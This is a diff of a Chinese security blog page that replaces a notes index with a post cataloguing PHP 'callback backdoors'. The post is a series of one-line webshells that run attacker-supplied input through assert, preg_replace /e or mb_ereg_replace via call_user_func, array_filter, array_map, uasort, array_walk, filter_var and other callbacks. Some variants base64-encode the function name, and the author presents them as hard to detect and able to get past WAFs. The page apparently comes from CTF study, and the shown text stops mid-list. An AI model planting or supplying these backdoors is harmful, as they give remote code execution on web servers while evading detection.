@@ -11,7 +11,7 @@
 
     <title>
         
-          ca01hの笔记本 - ca01h&#39;s Blog
+          Web安全学习之回调后门 - ca01h&#39;s Blog
         
     </title>
 
@@ -291,210 +291,100 @@ function sidebar_toggle() {
           <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 <div class="book-post">
   
-  <figure class="highlight plain"><figcaption><span>wiki</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> _____       ___   _____   ___   _   _        _____   _       _____   _____  </span><br><span class="line">&#x2F;  ___|     &#x2F;   | &#x2F;  _  \ |_  | | | | |      |  _  \ | |     &#x2F;  _  \ &#x2F;  ___| </span><br><span class="line">| |        &#x2F; &#x2F;| | | | | |   | | | |_| |      | |_| | | |     | | | | | |     </span><br><span class="line">| |       &#x2F; &#x2F; | | | |&#x2F;| |   | | |  _  |      |  _  | | |     | | | | | |  _  </span><br><span class="line">| |___   &#x2F; &#x2F;  | | | |_| |   | | | | | |      | |_| | | |___  | |_| | | |_| | </span><br><span class="line">\_____| &#x2F;_&#x2F;   |_| \_____&#x2F;   |_| |_| |_|      |_____&#x2F; |_____| \_____&#x2F; \_____&#x2F; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  <i class="fas fa-calendar-day"></i>&nbsp;2019-12-03&nbsp;
+  <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span><span> times</span>&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">1.4k</span>
+  
+  <h1 id="Web安全学习之PHP回调后门">Web安全学习之PHP回调后门</h1>
+<p>在做一道CTF渗透类型的题目时，做到最后一步看到了<code>array_walk()</code>函数，于是直接Google这个函数漏洞，果然存在着回调后门（貌似是P牛起的这个名字），在此延申一下知识点做一个记录。</p>
+<h2 id="什么是回调函数">什么是回调函数</h2>
+<p>回调函数就是将一个函数作为参数传入另一个函数的函数。php中有许多这样的函数，比如<code>call_user_func</code> , <code>call_user_func_array</code>,<code>array_map</code>等等，这些函数可以将函数作为参数执行后返回主函数，方便使用，但是既然可以将函数作为参数传入执行，如果将一些危险的函数作为参数传入，那就有可能成为一个可利用且不易检测的后门。</p>
+<h2 id="传统的回调后门">传统的回调后门</h2>
+<p><code>call_user_func()</code>在PHP中是回调的标准的函数，第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数，返回值为回调函数的结果。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="string">&#x27;assert&#x27;</span>, $_REQUEST[<span class="string">&quot;pass&quot;</span>]);</span><br></pre></td></tr></table></figure>
+<p><code>assert()</code>函数直接作为回调函数，然后<code>$_REQUEST[&quot;pass&quot;]</code>作为<code>assert</code>参数调用。</p>
+<p>另外，PHP还提供另外一个相似的函数<code>call_user_func_array()</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array(<span class="string">&#x27;assert&#x27;</span>, <span class="keyword">array</span>($_REQUEST[<span class="string">&#x27;pass&#x27;</span>]));</span><br></pre></td></tr></table></figure>
+<p><code>call_user_func_array</code>函数，和<code>call_user_func</code>类似，只是第二个参数可以传入参数列表组成的数组。</p>
+<h2 id="单个参数回调后门">单个参数回调后门</h2>
 <blockquote>
-<p><strong>ca01h@星盟安全</strong></p>
-<p>NTExOTY1NzM4QHFxLmNvbQ==</p>
+<p>注意：这里的单个参数指的是回调函数的参数个数</p>
 </blockquote>
-<p>互联网时代的知识是零散的，需要有一个写字的地方，把零散的知识汇聚起来，以点连线，以线聚面，一方面能形成一个完整的知识体系，另一方面自己所需之时方便查阅，于是乎就诞生了<strong>ca01hの笔记本</strong>。</p>
-<h2 id="TODO-LIST">TODO LIST</h2>
-<h3 id="2020">2020</h3>
-<p><strong>【未完成】SCTF复盘：<a target="_blank" rel="noopener" href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Web">https://github.com/SycloverSecurity/SCTF2020/tree/master/Web</a></strong></p>
-<p><strong>【未完成】<a target="_blank" rel="noopener" href="https://bycsec.top/2020/08/05/Thinkphp-vuln/">Thinkphp-vuln</a></strong></p>
-<h4 id="September">September</h4>
-<ul>
-<li><strong>【未完成】实习+HW</strong></li>
-<li><strong>【未完成】DataCon复盘</strong></li>
-</ul>
-<h4 id="August">August</h4>
-<ul>
-<li><s><strong>【已完成】XCTF——WMCTF</strong>（有幸做了一个签到题</s></li>
-<li><s><strong>【已完成】DataCon2020 DNS恶意流量分析</strong>（有幸混了一个鼓励奖</s>
-<ul>
-<li>DNS恶意域名分析
-<ul>
-<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/y0Wv5ci30HIhXp5bbCZxRg">https://mp.weixin.qq.com/s/y0Wv5ci30HIhXp5bbCZxRg</a></li>
-</ul>
-</li>
-<li>加密恶意流量检测
-<ul>
-<li>初赛：<a target="_blank" rel="noopener" href="https://s1mple.online/2020/08/09/DataCon2020-%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%88%9D%E8%B5%9B-Writeup-%E5%8F%8A%E6%80%BB%E7%BB%93%E5%8F%8D%E6%80%9D/">https://s1mple.online/2020/08/09/DataCon2020-加密恶意流量检测初赛-Writeup-及总结反思/</a></li>
-</ul>
-</li>
-<li>僵尸网络分析
-<ul>
-<li>第一题：<a target="_blank" rel="noopener" href="https://www.cdxy.me/?p=829">https://www.cdxy.me/?p=829</a></li>
-<li>第三题：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/186948840">https://zhuanlan.zhihu.com/p/186948840</a></li>
-</ul>
-</li>
-<li>网络黑产分析</li>
-<li>恶意代码分析
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/yuriufo/DataCon2020">https://github.com/yuriufo/DataCon2020</a></li>
-<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/187535672">https://zhuanlan.zhihu.com/p/187535672</a></li>
-<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/185715807">https://zhuanlan.zhihu.com/p/185715807</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><s><strong>【已完成】首届钓鱼城杯CTF</strong></s></li>
-<li><s><strong>【已完成】HW</strong></s></li>
-<li><s><strong>【已完成】<a target="_blank" rel="noopener" href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#htaccess">文件解析漏洞</a></strong></s></li>
-<li><strong>【未完成】《机器学习实战》前七章</strong></li>
-<li><s><strong>【已完成】BUUCTF刷题</strong></s></li>
-<li><strong>【未完成】HackTheBox OpenKeys（账号又被封了。。。</strong></li>
-<li><strong>【未完成】PHP构造反序列化链再学习</strong></li>
-</ul>
-<h4 id="July">July</h4>
-<ul>
-<li>
-<p><s><strong>【已完成】第五空间CTF复盘</strong></s></p>
-</li>
-<li>
-<p><s><strong>【已完成】DASCTF七月赛复盘</strong></s></p>
-</li>
-<li>
-<p><strong><s>【已完成】CSICTF2020复盘</s></strong></p>
-</li>
-<li>
-<p><s><strong>【已完成】2020电信天翼杯CTF</strong></s></p>
-</li>
-<li>
-<p><strong>【未完成】SUCTF2019 Upload2</strong></p>
-</li>
-<li>
-<p><strong>【未完成】N1CTF2018 Easy&amp;&amp;Hard PHP</strong></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2148">https://xz.aliyun.com/t/2148</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/wonderkun/CTF_web/tree/master/web600-1?1520941487499">https://github.com/wonderkun/CTF_web/tree/master/web600-1?1520941487499</a></p>
-</li>
-<li>
-<p><strong>【未完成】<a target="_blank" rel="noopener" href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Flask/Jinja2 SSTI &amp;&amp; Python 沙箱逃逸基础</a></strong></p>
-</li>
-<li>
-<p>【<strong>未完成】<a target="_blank" rel="noopener" href="https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/">PHP写配置漏洞</a></strong></p>
-</li>
-<li>
-<p><strong>【未完成】<a target="_blank" rel="noopener" href="https://www.smi1e.top/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8/">PHP弱类型比较</a></strong></p>
-</li>
-<li>
-<p><strong>【未完成】<a target="_blank" rel="noopener" href="https://zeroyu.xyz/2020/06/04/Code-breaking-Puzzles-2018-Note">Code Breaking 2018挑战赛学习——正则回溯</a></strong></p>
-</li>
-<li>
-<p><s><strong>【已完成】HackTheBox Tabby</strong></s></p>
-</li>
-<li>
-<p><s><strong>【已完成】HackTheBox Sneakymailer</strong></s></p>
-</li>
-<li>
-<p><strong>【未完成】Flask Pin码安全</strong></p>
-</li>
-</ul>
-<h4 id="June">June</h4>
-<ul>
-<li>
-<p><s>【已完成】<strong>RCTF2020</strong></s>（被完虐。。😭纯粹靠着队里的pwn师傅抬着走)</p>
-</li>
-<li>
-<p><s>【已完成】<strong>PHP反序列化——Phar</strong></s></p>
-</li>
-<li>
-<p><s>【已完成】<strong>PHP反序列化——Session</strong></s></p>
-</li>
-<li>
-<p>【未完成】<strong>新春战役 Hackme</strong>：<a target="_blank" rel="noopener" href="https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme">https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme</a></p>
-<ul>
-<li><strong>filter_var绕过</strong>：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/67064.html">https://www.secpulse.com/archives/67064.html</a></li>
-<li><strong>绕过四个字符限制getshell</strong>：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/87203">https://www.anquanke.com/post/id/87203</a></li>
-</ul>
-</li>
-<li>
-<p><s>【已完成】<strong>PHP反序列化——Soapclient</strong></s></p>
-<ul>
-<li><strong>LCTF bestphp’s revenge</strong></li>
-</ul>
-</li>
-<li>
-<p><s>【未完成】<strong>PHP反序列化——字符逃逸</strong></s></p>
-</li>
-<li>
-<p>【未完成】<a target="_blank" rel="noopener" href="https://yanmymickey.github.io/2020/04/14/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"><strong>PHP反序列化——Bypass</strong></a></p>
-</li>
-<li>
-<p><s>【未完成】<strong>代码审计学习——PHP-Audit-Code Day1-6</strong></s></p>
-</li>
-<li>
-<p>【未完成】<a target="_blank" rel="noopener" href="https://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/#GOPHER"><strong>phpinfo中的关键信息</strong></a></p>
-</li>
-<li>
-<p>【未完成】<strong>Redis安全学习</strong></p>
-</li>
-<li>
-<p><s>【已完成】<strong>BUUCTF刷题</strong></s></p>
-</li>
-<li>
-<p><s>【已完成】<strong>XMCTF解题</strong></s></p>
-</li>
-<li>
-<p><s>【已完成】<strong>第五空间CTF比赛（2020.06.24）</strong>（菜就一个字。。。）</s></p>
-</li>
-<li>
-<p><s>【已完成】<strong>队内AWD训练赛（2020.06.28）</strong></s></p>
-</li>
-</ul>
-<h2 id="Awesome-Articals-Projects">Awesome Articals/Projects</h2>
-<h3 id="Bypass-Tricks">Bypass &amp; Tricks</h3>
-<h4 id="PHP">PHP</h4>
-<h5 id="preg-match绕过">preg_match绕过</h5>
+<p>其实，在PHP中还有很多回调函数，这些含有回调（callable类型）参数的函数，其实都有做“回调后门”的潜力。 例如<code>array_filter()</code>函数：</p>
 <blockquote>
-<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p>
+<p><code>array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</code><br>
+依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p>
 </blockquote>
-<ul>
-<li>数组绕过</li>
-<li>PCRE回溯限制（code-breaking2018）</li>
-<li>换行符</li>
-</ul>
-<h5 id="PHP字符串解析特性绕过">PHP字符串解析特性绕过</h5>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">&#x27;pass&#x27;</span>],);</span><br><span class="line">array_filter($arr, base64_decode($e));</span><br></pre></td></tr></table></figure>
+<p><code>array_filter</code>函数是将数组中所有元素遍历并用指定函数处理过滤用的，<code>arr</code>数组中的每个元素都会作为base64解码后函数<code>e</code>的参数。如下图：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191121222629.png" alt=""></p>
+<p>类似<code>array_filter</code>，<code>array_map</code>也有相同的功效：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">&#x27;pass&#x27;</span>],);</span><br><span class="line">array_map(base64_decode($e), $arr);</span><br></pre></td></tr></table></figure>
+<p><strong>单参数后门的终极奥义：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">register_shutdown_function($e, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line">register_tick_function ($e, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">filter_var($_REQUEST[<span class="string">&#x27;pass&#x27;</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>));</span><br><span class="line">filter_var_array(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]), <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;filter&#x27;</span> =&gt; FILTER_CALLBACK, <span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>)));</span><br></pre></td></tr></table></figure>
+<p>最后一个是filter_var的利用，PHP里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且option为assert即可。</p>
+<h2 id="两个参数回调后门">两个参数回调后门</h2>
+<p>在PHP5.4.8+版本中，assert有一个新的可选参数<code>descrition</code>。</p>
 <blockquote>
-<p>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>
+<p>具体函数定义如下：</p>
+<p>assert ( mixed $assertion [, string $description ] ) : bool</p>
 </blockquote>
-<p>借用一张图简单地记一下</p>
-<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708203746.png" alt=""></p>
-<h5 id="SSRF-file协议绕过">SSRF file协议绕过</h5>
-<p>如果SSRF中<code>file://</code>关键字被禁用，可以使用<code>file:/</code>或者<code>file:///</code>来代替。</p>
-<p>例题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BGKCTF2020%5DEZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb">[GKCTF2020]EZ三剑客-EzWeb</a></p>
-<h5 id="Session绕过">Session绕过</h5>
-<p>删除cookie，没有cookie中的SESSIONID就找不到对应的session文件，相应的<code>$_SESSION['var']</code>就为NULL，相当于传参NULL。</p>
-<p>例题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BBJDCTF%202nd%5D%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B">BJDCTF2nd 文件探测</a></p>
-<h5 id="利用数组绕过">利用数组绕过</h5>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">sha1(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">ereg(pattern,<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">preg_match(pattern,<span class="keyword">Array</span>()) = <span class="literal">false</span></span><br><span class="line">strcmp(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strpos(<span class="keyword">Array</span>(),<span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strlen(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br></pre></td></tr></table></figure>
-<p>例题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5B0CTF%202016%5Dpiapiapia">0CTF2016 piapiapia</a></p>
-<h5 id="basename绕过">basename绕过</h5>
-<p>从 <a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=62119">https://bugs.php.net/bug.php?id=62119</a> 找到了<code>basename()</code>函数的一个问题，它会去掉文件名开头的非ASCII值：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(basename(<span class="string">&quot;xffconfig.php&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br><span class="line">var_dump(basename(<span class="string">&quot;config.php/xff&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br></pre></td></tr></table></figure>
-<p>例题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BZer0pts2020%5DCan%20you%20guess%20it?">[Zer0pts2020]Can you guess it?</a></p>
-<h5 id="htaccess利用">.htaccess利用</h5>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93">https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks总结</a></p>
-<h3 id="Linux入侵检测">Linux入侵检测</h3>
-<p><a target="_blank" rel="noopener" href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p>
-<h3 id="红蓝对抗">红蓝对抗</h3>
-<p><a target="_blank" rel="noopener" href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/hudunkey/Red-Team-links">https://github.com/hudunkey/Red-Team-links</a></p>
-<h3 id="代码审计">代码审计</h3>
-<p><a target="_blank" rel="noopener" href="https://github.com/CHYbeta/Code-Audit-Challenges">https://github.com/CHYbeta/Code-Audit-Challenges</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/hongriSec/PHP-Audit-Labs">https://github.com/hongriSec/PHP-Audit-Labs</a></p>
-<h3 id="WAF">WAF</h3>
-<p><a target="_blank" rel="noopener" href="https://wh0ale.github.io/2019/12/04/waf%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0Bypass/">https://wh0ale.github.io/2019/12/04/waf从入门到Bypass/</a></p>
-<p><a target="_blank" rel="noopener" href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756">https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756</a></p>
-<h3 id="java安全">java安全</h3>
-<p><a target="_blank" rel="noopener" href="https://github.com/threedr3am/learnjavabug">https://github.com/threedr3am/learnjavabug</a></p>
-<h3 id="Python安全">Python安全</h3>
-<p><a target="_blank" rel="noopener" href="https://github.com/bit4woo/python_sec">https://github.com/bit4woo/python_sec</a></p>
-<h3 id="字典">字典</h3>
-<p><a target="_blank" rel="noopener" href="https://github.com/insightglacier/Dictionary-Of-Pentesting">https://github.com/insightglacier/Dictionary-Of-Pentesting</a></p>
-<h3 id="求职">求职</h3>
-<p><a target="_blank" rel="noopener" href="https://github.com/geekcompany/ResumeSample">https://github.com/geekcompany/ResumeSample</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/zhaoweiho/web-sec-interview">https://github.com/zhaoweiho/web-sec-interview</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/EvilAnne/Pentest_questions">https://github.com/EvilAnne/Pentest_questions</a></p>
+<p>所以较于之前的PHP版本，我们可以使用一些新的方式去进行调用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">uasort($arr, base64_decode($e));</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注意：<code>$arr</code>数组中的元素都是回调函数<code>$e</code>的参数！</p>
+</blockquote>
+<p>在PHP5.4.8以上版本可以正常执行：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191122154659.png" alt=""></p>
+<p>还有一些类似的函数，比如说<code>uksort()</code>：</p>
+<blockquote>
+<p>具体函数定义如下：</p>
+<p>uksort ( array &amp;$array , callable $key_compare_func ) : bool</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">uksort($arr, base64_decode($e));</span><br></pre></td></tr></table></figure>
+<p>以及面向对象的方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// way 0</span></span><br><span class="line">$arr = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line">$arr-&gt;uasort(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// way 1</span></span><br><span class="line">$arr = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="number">1</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="number">2</span>));</span><br><span class="line">$arr-&gt;uksort(<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>再比如<code>array_reduce()</code>：</p>
+<blockquote>
+<p>PHP 4 &gt;= 4.0.5, PHP 5, PHP 7)<br>
+array_reduce — 用回调函数迭代地将数组简化为单一的值</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_reduce($arr = <span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>), base64_decode($_REQUEST[<span class="string">&#x27;e&#x27;</span>]), $_REQUEST[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p><code>array_udiff()</code>函数</p>
+<blockquote>
+<p>(PHP 5, PHP 7)<br>
+array_udiff — 用回调函数比较数据来计算数组的差集</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_udiff($arr = <span class="keyword">array</span>($_REQUEST[<span class="string">&#x27;a&#x27;</span>]), $arr1 = <span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>), base64_decode($_REQUEST[<span class="string">&#x27;e&#x27;</span>]));</span><br></pre></td></tr></table></figure>
+<h2 id="三个参数回调后门">三个参数回调后门</h2>
+<p>有些函数需要的回调函数类型比较苛刻，回调格式需要三个参数，比如<code>array_walk()</code>。</p>
+<blockquote>
+<p>函数定义：array_walk ( array <code>&amp;$array</code> , callable<code>$callback</code> [, mixed <code>$userdata</code> = <strong><code>NULL</code></strong> ] ) : bool</p>
+</blockquote>
+<p>它的参数解释：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191122165733.png" alt=""></p>
+<p>三个参数可以用<code>preg_replace()</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,);</span><br><span class="line">array_walk($arr, $e, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>执行效果如下图：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191122191940.png" alt=""></p>
+<p>需要对这段代码做出一定的解释：</p>
+<p><code>preg_replace</code> 函数是用来执行一个正则表达式的搜索和替换，它的函数定义如下：</p>
+<blockquote>
+<p>preg_replace ( mixed <code>$pattern</code> , mixed <code>$replacement</code> , mixed <code>$subject</code> [, int <code>$limit</code> = -1 [, int <code>&amp;$count</code> ]] ) : mixed</p>
+</blockquote>
+<p>根据<code>array_walk()</code>参数解释可以得出，<code>array_walk($arr, $e, '');</code>等价于：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">&#x27;|.*|e&#x27;</span>, <span class="string">&#x27;phpinfo()&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>第一个参数<code>|.*|e</code>表示的是<a target="_blank" rel="noopener" href="https://blog.csdn.net/windqyoung/article/details/8635418">\e模式匹配</a>，即会把replacement参数当作PHP语句来执行，<code>.*</code>是贪婪匹配。</p>
+<p>除了<code>array_walk()</code>，还可以使用<code>array_walk_recurcive()</code>，参数的位置都是一样的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,);</span><br><span class="line">array_walk_recursive($arr, $e, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>看了以上几个回调后门，发现<code>preg_replace()</code>确实好用。但显然很多WAF都会对其有所防备。其实PHP里不止这个函数可以执行eval的功能，还有几个类似的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mb_ereg_replace(<span class="string">&#x27;.*&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>另外一个：</p>
